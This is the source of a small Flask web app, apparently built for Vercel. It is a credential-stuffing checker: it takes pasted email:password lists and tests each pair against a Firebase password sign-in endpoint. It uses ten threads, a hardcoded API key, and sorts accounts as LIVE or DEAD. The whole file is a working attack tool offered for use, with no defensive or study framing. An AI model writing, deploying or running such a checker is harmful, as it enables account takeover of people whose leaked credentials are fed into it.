from flask import Flask, render_template, request, jsonify
import requests
import random
from multiprocessing.dummy import Pool as ThreadPool

app = Flask(__name__)

# Firebase API Key
API_KEY = "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"

@app.route('/')
def index():
    return render_template('index.html')

def check_account(line):
    if ":" not in line: return None
    mail, pw = line.strip().split(':')
    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={API_KEY}"
    try:
        res = requests.post(url, json={"email": mail, "password": pw}, timeout=5).json()
        if "idToken" in res:
            return {"status": "LIVE", "account": f"{mail}:{pw}"}
        return {"status": "DEAD", "account": f"{mail}:{pw}"}
    except:
        return None

@app.route('/start_scan', methods=['POST'])
def start_scan():
    combos = request.json.get('combos', '').split('\n')
    pool = ThreadPool(10) # Vercel için 10 thread idealdir
    results = pool.map(check_account, [c for c in combos if c.strip()])
    pool.close()
    pool.join()
    
    final_results = [r for r in results if r is not None]
    stats = {
        "live": len([r for r in final_results if r['status'] == "LIVE"]),
        "dead": len([r for r in final_results if r['status'] == "DEAD"]),
        "checked": len(final_results)
    }
    return jsonify({"results": final_results, "stats": stats})
